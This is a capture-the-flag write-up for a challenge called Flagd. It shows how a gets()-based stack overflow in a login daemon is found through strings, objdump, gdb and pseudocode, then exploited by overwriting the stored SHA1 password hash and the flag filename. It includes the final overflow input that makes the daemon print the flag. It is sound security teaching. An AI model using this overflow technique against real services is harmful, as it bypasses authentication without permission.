# 06 Flagd

A network service is protected by a username and password. The service will
reveal the flag after entering the correct username and password.

The source code to the daemon (minus the flag) is provided.

## Write-up

Connecting to the network service you are prompted for the username and
password. Incorrect credentials cause the connection to drop.

```
% nc 127.0.0.1 8081
username: toby
password: foo
try again
```

First strings, and some revealing finds:

```
572605b7H
a56995dcH
fbb67f34H
d8fc66b9H
e1add93dH
flag.txtH
dH34%(
[]A\A]A^A_
0123456789abcdef
usage: flagd port
flagd
username:
password:
admin
couldn't open flag file.
flag{
invalid flag file!
here is your flag: %s
try again
```

We can make some assumptions:
* the daemon reads the flag from a local file called flag.txt.
* that file contains the flag text, which will be inserted between flag{ and }
  which are added by the daemon.
* the daemon intends to output the flag to the user.
* the username is "admin".

The block of hex at the top is curious. This could be the encoded password:
`572605b7a56995dcfbb67f34d8fc66b9e1add93d`. It doesn't directly convert back to
ASCII. The length though, 40 characters, is exactly right for a sha1sum value.

Next thing was to check how the password is compared in the daemon. I
disassembled the daemon with objdump and fortunately it was not stripped. The
daemon will fork for incoming connections and then run a "got_client"
routine, which is the most interesting part of the daemon.

After reading the code I could see it `gets` two inputs from user, the username
and the password. It then uses SHA1 and to_hex functions, presumably on the
user's password. The username was in the binary, the password could be too and
it may be that hex block.

I confirmed this idea by running the daemon in gdb and setting a breakpoint
where it does the comparisons. Here is the point in the daemon just before it
compares the password. You can see the argument for memcmp stored in rcx/rsi
contains the hex value.

```
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x00007FFFFFFFE040  RBX: 0x0000000000000000  RBP: 0x00007FFFFFFFE1C0  RSP: 0x00007FFFFFFFE040  o d I t s Z a P c
  RDI: 0x00007FFFFFFFE088  RSI: 0x0000555555555738  RDX: 0x0000000000000000  RCX: 0x00007FFFFFFFE145  RIP: 0x00005555555552AE
  R8 : 0x00007FFFFFFFDFA0  R9 : 0x00007FFFFFFFDFFC  R10: 0x0000000000000838  R11: 0x00007FFFF7662860  R12: 0x0000555555554EB0
  R13: 0x00007FFFFFFFE320  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x5555555552ae <got_client+384>:	lea    rax,[rbp-0x180]
   0x5555555552b5 <got_client+391>:	add    rax,0xdc
   0x5555555552bb <got_client+397>:	mov    edx,0x28
   0x5555555552c0 <got_client+402>:	mov    rsi,rcx
   0x5555555552c3 <got_client+405>:	mov    rdi,rax
   0x5555555552c6 <got_client+408>:	call   0x555555554e10 <memcmp@plt>
   0x5555555552cb <got_client+413>:	test   eax,eax
   0x5555555552cd <got_client+415>:	jne    0x5555555553aa <got_client+636>
-----------------------------------------------------------------------------------------------------------------------------
0x00005555555552ae in got_client ()
gdb$ x/s $rcx
0x7fffffffe145:	"572605b7a56995dcfbb67f34d8fc66b9e1add93d"
```

I ran the password through john to see if it was something easily guessed.
However, after 24 hours of dictionary and brute forcing, I decided to stop it
since the number of points for the challenge did not seem to warrant it. If it
was one of those kinds of challenges it would typically be found quickly.

Next I checked [Testing for Stack
Overflow](https://www.owasp.org/index.php/Testing_for_Stack_Overflow) to see if
the C functions in the got_client routine where vulnerable and found that gets
and strlen are.

To make things easier to read I tried using hopper to generate pseudo code for
the got_client routine:

```
    printf("username: ");
    fflush(**stdout);
    gets(&var_0 + 0x48);
    printf("password: ");
    fflush(**stdout);
    gets(&var_0 + 0x8);
    rax = strlen(&var_0 + 0x8);
    SHA1(&var_0 + 0x8, rax, &var_0 + 0xc8);
    to_hex(&var_0 + 0xc8, 0x14, &var_0 + 0xdc);
    rax = strcmp(&var_0 + 0x48, "admin");
    if (rax != 0x0) goto loc_13aa;
    goto loc_12a0;
```

This reveals:
* User's username stored in 0x48 (72)
* User's password stored in 0x8 (8)
* User's password run through SHA1 and stored in 0xc8 (200)
* User's password run through to_hex and stored in 0xdc (220)
* Real password stored in 0x105 (261)
* The real password is 0x28 (40) characters long
* The length of the username isn't checked, but the first 5 characters must
  match "admin".
* Password is stored before the username, so it could be used to overwrite
  everything that comes afterwards

I sketched out the memory structure to understand what the layout (. =
unknown, % = unused buffer space that we can control):
```
          1         2         3         4         5         6         7         8         9
0123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789
........0x8-password%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%0x48-username%%%%%%%%%%%%%%%

100
          1         2         3         4         5         6         7         8         9
0123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

200
          1         2         3         4         5         6         7         8         9
0123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789
0xc8-SHA1-result%%%%0xdc-to_hex-result%%%%%%%%%%%%%%%%%%%%%%%0x105-real-password%%%%%%%%%%%%%%%%%%%%

300
          1         2         3         4         5         6         7         8         9
0123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789
%%..................................................................................................
```

There is the potential that we can craft a string for either the username or
password and overwrite the values after it to put the conditions under our
control and make the program think we provided the correct password when in
fact we just change what password it checks internally to the one we provide at
the prompt.

Generate a SHA1 value I know the original value of, can be anything:
```
% echo -n "password" | sha1sum
5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8  -
```

Again, sketched out what the memory would look like substituting values to
send, using "password" as the password and replacing the binary's password.
(Note: # is null character, so strlen() captures the plain-text password we
already computed)

```
          1         2         3         4         5         6         7         8         9
0123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789
        password#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%admin%%%%%%%%%%%%%%%%%%%%%%%

100
          1         2         3         4         5         6         7         8         9
0123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

200
          1         2         3         4         5         6         7         8         9
0123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%5baa61e4c9b93f3f0682250b6cf8331b7ee68fd

300
          1         2         3         4         5         6         7         8         9
0123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789
8%..................................................................................................
```

Then rolled this up into a single value that I would provide for the password
prompt.

```
password\x00%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%admin%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8%
```

Alternatively, we could just start from the username instead though and save a
little effort. So now I have something like:

```
username: admin%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8%
password: password
```

When I tried this I found it did not work. While debugging in gdb and exploring
the memory I noticed the flag.txt file name has to appear in the correct place
too.

```
username: admin%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%flag.txt%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8
password: password
```

This still wasn't working. Debugging in gdb again I saw the my password as
passing the comparison. It was failing on the username (which is compared
after the password). This must be something trivial. Reviewing the code I
realised the username should be null-terminated.

```
username: admin^@%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%flag.txt%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8
password: password
couldn't open flag file.
```

Success... almost! Null-terminate the flag file name...

```
username: admin^@%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%flag.txt^@%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8
password: password
here is your flag: flag{zer0_c0de_eXecution_n3cessary}
```
